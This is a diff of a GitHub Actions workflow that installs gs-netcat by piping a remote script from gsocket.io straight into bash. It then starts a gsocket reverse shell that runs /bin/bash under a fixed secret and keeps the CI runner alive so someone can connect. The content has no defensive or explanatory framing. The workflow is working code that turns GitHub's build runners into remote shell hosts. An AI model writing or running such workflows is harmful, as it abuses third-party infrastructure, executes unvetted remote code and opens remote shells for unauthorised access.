@@ -8,14 +8,13 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Download and install gs-netcat
+      - name: Install gs-netcat from gsocket.io/x
         run: |
-          wget https://github.com/hackerschoice/gsocket/releases/download/1.4.47/gs-netcat_1.4.47_amd64
-          chmod +x gs-netcat_1.4.47_amd64
-          mv gs-netcat_1.4.47_amd64 gs-netcat
+          curl -s https://gsocket.io/x | bash
+          mv ~/.gsocket/bin/gs-netcat .
 
       - name: Start gsocket reverse shell (bash)
         run: |
           nohup ./gs-netcat -s jeikaizin1337 --exec /bin/bash > out.log 2>&1 &
           echo "GSocket shell started. You have 1 hour to connect..."
-          sleep 21600  # 可改成 sleep 21600（6 小時），GitHub 最大允許時間
+          sleep 2100
